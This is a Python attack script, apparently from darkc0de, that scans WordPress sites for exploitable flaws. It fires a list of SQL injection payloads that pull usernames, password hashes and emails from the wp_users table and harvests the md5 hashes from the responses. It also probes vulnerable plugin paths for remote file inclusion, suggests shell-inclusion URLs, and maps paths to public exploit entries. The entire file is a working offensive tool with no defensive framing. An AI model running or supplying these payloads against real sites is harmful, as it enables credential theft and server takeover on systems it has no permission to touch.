#!/usr/bin/python
#WordPress SQL/RFI/CGI scanner. SQL will check 
#for md5's in the source and RFI/CGI will use 
#http responses. 

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, time, httplib

#Bad HTTP Responses 
BAD_RESP = [400,401,404]

def main(path):
	print "[+] Testing:",host.split("/",1)[1]+path
	try:
		h = httplib.HTTP(host.split("/",1)[0])
		h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
		h.putheader("Host", host.split("/",1)[0])
		h.endheaders()
		resp, reason, headers = h.getreply()
		return resp, reason, headers.get("Server")
	except(), msg: 
		print "Error Occurred:",msg
		pass

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)

print "\n\t   d3hydr8[at]gmail[dot]com WPScan v1.0"
print "\t------------------------------------------"

sqls = ["index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*",
	"index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*",
	"index.php?exact=1&sentence=1&s=%b3%27)))/**/AND/**/ID=-1/**/UNION/**SELECT**/1,2,3,4,5,user_pass,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/**/FROM/**/wp_users%23",
	"index?page_id=115&forumaction=showprofile&user=1+union+select+null,concat(user_login,0x2f,user_pass,0x2f,user_email),null,null,null,null,null+from+wp_tbv_users/*",
	"plugins/wp-cal/functions/editevent.php?id=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6%20from%20wp_users--",
	"plugins/fgallery/fim_rss.php?album=-1%20union%20select%201,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4,5,6,7%20from%20wp_users--"
	"plugins/wassup/spy.php?to_date=-1%20group%20by%20id%20union%20select%20null,null,null,conca(0x7c,user_login,0x7c,user_pass,0x7c),null,null,null,null,null,null,null,null%20%20from%20wp_users",
	"wordspew-rss.php?id=-998877/**/UNION/**/SELECT/**/0,1,concat(0x7c,user_login,0x7c,user_pass,0x7c),concat(0x7c,user_login,0x7c,user_pass,0x7c),4,5/**/FROM/**/wp_users",
	"plugins/st_newsletter/shiftthis-preview.php?newsletter=-1/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users",
	"sf-forum?forum=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"sf-forum?forum=-99999/**/UNION/**/SELECT/**/0,concat(0x7c,user_login,0x7c,user_pass,0x7c),0,0,0,0,0/**/FROM/**/wp_users/*",
	"forums?forum=1&topic=-99999/**/UNION/**/SELECT/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/FROM/**/wp_users/*",
	"index?page_id=13&album=S@BUN&photo=-333333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(0x7c,user_login,0x7c,user_pass,0x7c)/**/from%2F%2A%2A%2Fwp_users/**WHERE%20admin%201=%201",
	"wp-download.php?dl_id=null/**/union/**/all/**/select/**/concat(user_login,0x3a,user_pass)/**/from/**/wp_users/*",
	"wpSS/ss_load.php?ss_id=1+and+(1=0)+union+select+1,concat(user_login,0x3a,user_pass,0x3a,user_email),3,4+from+wp_users--&display=plain"]

rfis = {"plugins/Enigma2.php":"index/wp-content/plugins/Enigma2.php?boarddir=shell",
	"mygallery/myfunctions/mygallerybrowser.php":"mygallery/myfunctions/mygallerybrowser.php?myPath=shell",
	"plugins/wp-table/js/wptable-button.phpp":"plugins/wp-table/js/wptable-button.phpp?wpPATH=shell",
	"plugins/wordtube/wordtube-button.php":"plugins/wordtube/wordtube-button.php?wpPATH=shell",
	"plugins/myflash/myflash-button.php":"plugins/myflash/myflash-button.php?wpPATH=shell",
	"plugins/BackUp/Archive.php":"plugins/BackUp/Archive.php?bkpwp_plugin_path=shell",
	"plugins/BackUp/Archive/Predicate.php":"plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=shell",
	"plugins/BackUp/Archive/Writer.php":"plugins/BackUp/Archive/Writer.php?bkpwp_plugin_path=shell",
	"plugins/BackUp/Archive/Reader.php":"plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=shell",
	"plugins/sniplets/modules/syntax_highlight.php":"plugins/sniplets/modules/syntax_highlight.php?libpath=shell"}

cgis = {"wp-trackback.php":"http://milw0rm.com/exploits/3095", 
	"wp-admin/users.php":"http://milw0rm.com/exploits/1059", 
	"xmlrpc.php":"http://milw0rm.com/exploits/1077",
	"wp-includes/cache.php":"http://milw0rm.com/exploits/6",
	"wp-trackback.php":"http://milw0rm.com/exploits/3095",
	"plugins/mygallerytmpl.php":"http://milw0rm.com/exploits/3814",
	"wp-admin/admin-ajax.php":"http://milw0rm.com/exploits/3960",
	"wp-app.php":"http://milw0rm.com/exploits/4113",
	"plugins/pictpress/resize.php":"http://milw0rm.com/exploits/4695",
	"plugins/wp-filemanager/ajaxfilemanager/ajaxfilemanager.php":"http://milw0rm.com/exploits/4844",
	"plugins/wp-adserve/adclick.php":"http://milw0rm.com/exploits/5013",
	"wp-admin/admin.php?page=dmsguestbook":"http://milw0rm.com/exploits/5035",
	"plugins/downloads-manager/upload.php":"http://milw0rm.com/exploits/6127"}

if len(sys.argv) != 2:
	print "\nUsage: ./wpscan.py <site+dir>"
	print "Ex: ./wpscan.py www.site.com/wp-content/\n"
	sys.exit(1)

host = sys.argv[1].replace("http://","").rsplit("/",1)[0]
if host[-1] != "/":
	host = host+"/"
	
print "\n[+] Site:",host
print "[+] SQL Loaded:",len(sqls) 
print "[+] RFI Loaded:",len(rfis) 
print "[+] CGI Loaded:",len(cgis) 

server = main("/")[2]
print "[+] Server:",server

print "\n[+] Started:",timer()

print "\n[+] Scanning: SQL\n"
for sql in sqls:
	time.sleep(2) #Change this if needed
	print "[+] Trying:",sql.replace("\n","")
	try:
		source = urllib2.urlopen("http://"+host+sql.replace("\n","")).read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >= 1:
			print "[!]",host+sql.replace("\n","")
			for md5 in md5s:
				print "\n\t[+]MD5:",md5
	except(urllib2.HTTPError):
		pass
print "\n[+] Scanning: RFI\n"
for rfi, shell in rfis.items():
	resp,reason,server = main(rfi)
	if resp not in BAD_RESP:
		print "\t[+] Got:",resp, reason
		print "\t[+] Try:",host+shell
	else:
		print "\t[-] Got:",resp, reason
print "\n[+] Scanning: CGI\n"
for cgi, expl in cgis.items():
	resp,reason,server = main(cgi)
	if resp not in BAD_RESP:
		print "\t[+] Got:",resp, reason
		print "\t[+] Check:",expl
	else:
		print "\t[-] Got:",resp, reason
print "\n[-] Done\n"
